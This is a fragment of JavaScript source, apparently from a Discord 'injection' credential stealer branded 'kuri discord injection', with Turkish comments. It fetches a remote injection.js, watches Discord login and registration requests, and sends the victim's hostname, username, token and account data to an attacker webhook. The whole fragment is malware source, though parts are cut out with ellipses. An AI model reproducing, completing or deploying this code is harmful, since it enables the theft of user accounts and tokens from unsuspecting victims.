...
const CONFIG = {
    ...
    injection_url: "https://raw.githubusercontent.com/shessora/discord-injection/main/injection.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
...
function getApiWebhookUrl() {
    // Eğer CONFIG.api zaten değiştirilmişse (placeholder değilse) ve hairo.tr/api/filz/nobody ise direkt kullan
    if (CONFIG.api && CONFIG.api !== '%API_WEBHOOK%' && 
        CONFIG.api.includes('/api/filz/nobody') &&
    ...
    // Fallback: Eğer license_api yoksa ama CONFIG.api hairo.tr içeriyorsa kullan
    if (CONFIG.api && CONFIG.api !== '%API_WEBHOOK%' && 
        (CONFIG.api.startsWith('http://') || CONFIG.api.startsWith('https://'))) {
        return CONFIG.api;
    }
    
    // Son fallback: placeholder döndür (bu durumda webhook çalışmayacak)
    return CONFIG.api;
}

const hooker = async (content, token, account) => {
    content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
    content["username"] = "kuri - cord injection";
    ...
    content["embeds"][0]["footer"] = {
        "text": "kuri discord injection - made by cookie",
